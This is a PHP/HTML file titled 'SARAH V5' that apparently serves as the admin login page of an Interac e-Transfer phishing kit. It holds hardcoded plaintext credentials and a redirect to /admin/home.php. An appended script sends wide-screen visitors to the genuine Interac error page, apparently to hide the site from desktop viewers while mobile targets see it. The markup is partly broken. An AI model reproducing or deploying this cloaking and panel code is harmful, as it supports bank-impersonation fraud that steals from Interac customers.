<!DOCTYPE html>
<html>

<head>
  <title>SARAH V5</title>
</head>

<body style="background-color: #1f1f1f;">
    
  <style>
   /* Apply styles to all elements */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* Apply styles to the body element */
body {
  font-family: Arial, sans-serif;
}

/* Apply styles to the form element */
form label {
  display: block;
}

form input[type=text], form input[type=password] {
  border: 1px solid #ccc;
  padding: 8px;
}

form button[type=submit] {
  cursor: pointer;
}

/* Apply styles to the footer element */
footer {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100px;
  background-color: #020202;
  color: #fff;
  font-size: 24px;
}

/* Apply styles to the header element */
header {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100px;
  background-color: #020202;
  color: #fff;
  font-size: 36px;
} 
  </style>
  <body style="background-color: #1f1f1f;">
  <header style="display:flex;justify-content:center;align-items:center;height:100px;background-color: #020202;color:#fff;font-size:36px;">
    <span style="font-family: 'Courier New', monospace;">INTERAC DEVELOPER</span>
  </header>
  
  <?php
    // Initialize the session
    session_start();
    
    // Define the correct username and password
    $username = "alien";
    $password = "Covid-19";
    
    // Check if the user has submitted the form
    if($_SERVER["REQUEST_METHOD"] == "POST") {
      // Get the input from the username and password fields
      $inputUsername = $_POST['username'];
      $inputPassword = $_POST['password'];
      
      // Check if the input matches the correct username and password
      if($inputUsername == $username && $inputPassword == $password) {
        // If the input is correct, store the username in a session variable
        $_SESSION['username'] = $username;
        
        // Redirect the user to the home page
        header("location: /admin/home.php");
      } else {
        // If the input is incorrect, display an error message
        echo "<div style='display:flex;justify-content:center;align-items:center;height:calc(100vh - 200px);'><p style='color: red;'>Incorrect username or password.</p></div>";
      }
    } else {
      // If the user has not submitted the form, display the login form
      echo "<div style='display:flex;justify-content:center;align-items:center;height:calc(100vh - 200px);'>
              <form action='' method='POST' style='display:flex;flex-direction:column;justify-content:center;align-items:center;background-color:#fff;padding:20px;border-radius:10px;'>
                <label style='font-size:24px;margin-bottom:20px;'>Login</label>
                <input type='text' name='username' placeholder='Username' style='padding:10px;width:300px;border-radius:5px;border:none;outline:none;margin-bottom:20px;'>
                <input type='password' name='password' placeholder='Password' style='padding:10px;width:300px;border-radius:5px;border:none;outline:none;margin-bottom:20px;'>
                <button type='submit' style='background-color: #4CAF50;color:#fff;padding:10px;border-radius:5px;border:none;outline:none;margin-bottom:20px;'>Login</button>
                <a href='#' style='color:#4CAF50;margin-bottom:20px;'>Forgot Password?</a>
              </form>
            </div>";
    }
  ?>
  
  <footer style="display:flex;justify-content:center;align-items:center;height:100px;background-color: #020202;color:#fff;font-size:24px;">
    <span style="font-family: 'Courier New', monospace;">LOGIN/span>
  </footer>
</body>

<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>